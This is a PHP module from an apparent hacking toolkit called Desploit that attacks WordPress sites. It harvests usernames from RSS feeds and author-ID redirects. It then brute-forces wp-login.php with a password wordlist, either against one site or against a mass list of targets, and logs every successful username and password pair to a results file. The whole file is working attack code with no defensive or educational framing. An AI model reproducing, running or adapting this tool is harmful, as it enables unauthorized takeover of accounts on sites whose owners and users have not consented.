<?php
class Wordpress extends Modules
{
	function check($url,$username,$password){
		$ref    = str_replace("wp-login.php", "wp-admin/", $url);
		$Origin = str_replace("wp-login.php", "", $url);
		$header = array(
    		"content-type: application/x-www-form-urlencoded",
    		"origin: ".$Origin,
    		"referer: ".$ref
		);
		$result = $this->ngecurl($url , "log=".$username."&pwd=".$password , $header);
		$this->Debug( $result );
		$re = '/\.php\?action=logout/';
		preg_match_all($re, $result, $matches);
		if( $matches[0][0] ){
			return true;
		}
		return false;
	}
	function detectuser($urls)
	{	$this->msg("[WPbrute][Grab User] Pleas wait...");
		$mode = array('?feed=rss2','?rss.xml');
		foreach ($mode as $key => $modes) {
			$this->msg("[WPbrute][Grab User] Checking Mode ".$key);
			$url = $this->ngeChuk($urls.$modes);
			if( $this->mod_httpcode($url) === 200){
				$re = '/<dc:creator><![CDATA[]+(.*?)]]><\/dc:creator>/';
				preg_match_all($re, $this->ngecurl($url) , $matches);
				$this->msg("[WPbrute][Grab User] w00t ".count(array_unique($matches[1]))." user");
				foreach ($matches[1] as $key => $userne) {
					$user[] = $userne;
				}
			}
		}
		$desploit = new Desploit;
		$grabuser = $desploit->ConfigWP()['grabuser'];
		for ($i=0; $i < $grabuser; $i++) { 
			$result = $this->ngecurl($urls."?author=".$i);
			$reuser = "/\\/author\\/(.*?)\\//"; 
	        preg_match($reuser, $result, $matches);
	        if( $matches[1] ){
	          	$user[] = $matches[1];
	        }
	        $this->msg("[WPbrute][Grab User] $i of $grabuser | w0ot ".count($user)." user");
		}
		$user = array_unique($user);
		$this->msg("[WPbrute][Grab User] remove duplicates user | w0ot : ".count($user)." user");
		return $user;
	}
	function single($url,$setuser,$passwordlist){
		$url 	= $this->ngeChuk($url);
		$this->msg("[WPbrute][SET Target] Sites : ".$url);

		if(!file_exists($passwordlist)){
			$passwordlist = "db/wordpress/password.txt";
		}
		switch ($setuser) {
			case 'auto':
				$user = $this->detectuser($url);
			break;
			default:
				$user[] = $setuser;
			break;
		}
		$hit = count($user);
		foreach ($user as $key => $users) {
			$wordlist = $this->loadFile($passwordlist);
			$countWL  = count($wordlist);
			foreach ($wordlist as $key => $pass) {
				if( $this->check($url."wp-login.php",$users,$pass) ){
					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
					$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");
				}else{
					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
				}
				$countWL = $countWL-1;
			}
			$hit = $hit-1;
		}
	}

	function mass($list,$setuser,$passwordlist){
		if(!file_exists($passwordlist)){
			$passwordlist = "db/wordpress/password.txt";
		}
		$files = $this->loadFile($list);
		$siteshit = count($files);
		foreach ($files as $key => $sites) {
			$this->msg("[WPbrute][".$siteshit."] Site : ".$sites);
			$url 	= $this->ngeChuk($sites);
			switch ($setuser) {
				case 'auto':
					$user = $this->detectuser($url);
				break;
				default:
					$user[] = $setuser;
				break;
			}
			$hit = count($user);
			foreach ($user as $key => $users) {
			$wordlist = $this->loadFile($passwordlist);
			$countWL  = count($wordlist);
				foreach ($wordlist as $key => $pass) {
					if( $this->check($url."wp-login.php",$users,$pass) ){
						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
						$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");		
					}else{
						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
					}
				}
				$hit = $hit-1;
			}
			$siteshit = $siteshit-1;echo "\r\n";
		}
	}

}